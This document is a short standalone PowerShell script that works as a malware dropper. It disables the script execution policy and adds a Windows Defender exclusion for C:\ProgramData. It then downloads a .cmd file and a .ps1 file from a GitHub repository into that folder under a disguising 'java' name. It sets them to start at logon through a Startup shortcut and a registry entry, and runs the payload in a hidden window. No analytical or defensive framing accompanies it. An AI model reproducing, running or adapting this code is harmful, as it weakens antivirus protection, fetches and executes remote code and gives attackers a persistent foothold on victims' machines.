Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Bypass -Force
Set-MpPreference -ExclusionPath 'C:\ProgramData'
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
$urls = @{
    'https://github.com/emyenglish/log/raw/main/java.cmd?raw=true' = 'C:\ProgramData\java.cmd'
    'https://github.com/emyenglish/log/raw/main/main.ps1?raw=true' = 'C:\ProgramData\main.ps1'
}
$webClient = New-Object System.Net.WebClient
$urls.Keys | ForEach-Object { $url = $_; $file = $urls[$url]; $webClient.DownloadFile($url, $file) }
$shortcutPath = Join-Path -Path $env:APPDATA -ChildPath 'Microsoft\Windows\Start Menu\Programs\Startup\java.lnk'
$targetPath = 'C:\ProgramData\java.cmd'
$shell = New-Object -ComObject WScript.Shell
$shortcut = $shell.CreateShortcut($shortcutPath); $shortcut.TargetPath = $targetPath; $shortcut.Save()
$regKeyPath = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run'
$regKeyValueName = 'java.cmd'
$regKeyValue = $shortcutPath
if (!(Test-Path $regKeyPath)) { New-Item -Path $regKeyPath -Force | Out-Null }
Set-ItemProperty -Path $regKeyPath -Name $regKeyValueName -Value $regKeyValue
Start-Process $targetPath -WindowStyle Hidden
exit




